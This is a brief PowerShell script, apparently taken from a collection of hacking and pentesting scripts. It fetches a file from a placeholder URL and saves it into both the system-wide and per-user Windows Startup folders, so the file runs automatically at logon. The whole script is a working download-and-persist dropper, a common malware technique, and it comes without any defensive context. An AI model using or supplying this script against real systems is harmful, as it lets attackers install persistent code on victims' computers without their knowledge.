# Download and save it the startup folder and startup Program
# For More Info Visit https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters

$sourceUrl = "FILE_Link"
$filename = "filename.ext"

$currentUser = $env:UserName

$globalStartupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\$filename"
$userStartupPath = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$filename"

Invoke-WebRequest -Uri $sourceUrl -OutFile $globalStartupPath
Invoke-WebRequest -Uri $sourceUrl -OutFile $userStartupPath

Write-Host "File downloaded and saved to both startup locations."
